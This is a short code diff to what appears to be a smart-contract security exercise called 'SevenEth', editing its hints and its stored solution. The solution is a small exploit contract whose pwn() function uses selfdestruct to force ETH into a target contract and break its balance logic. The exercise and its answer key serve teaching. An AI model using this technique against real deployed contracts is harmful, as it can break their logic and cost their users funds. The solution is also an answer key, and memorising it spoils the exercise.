@@ -219,11 +219,14 @@ contract SevenEth {
       },
     ],
     hints: [
-      'Force ETH balance of contract to be more than 7 ETH',
+      'Force ETH balance of contract to be more than 0.01 ETH',
       'selfdestruct can force send ETH to a contract',
       'Use selfdestruct in pwn function to send ETH to target',
+      'The exploit contract needs a receive() function to receive ETH from the wrapper',
     ],
-    solution: `function pwn() external payable {
+    solution: `receive() external payable {}
+
+function pwn() external payable {
     selfdestruct(payable(target));
 }`,
   },
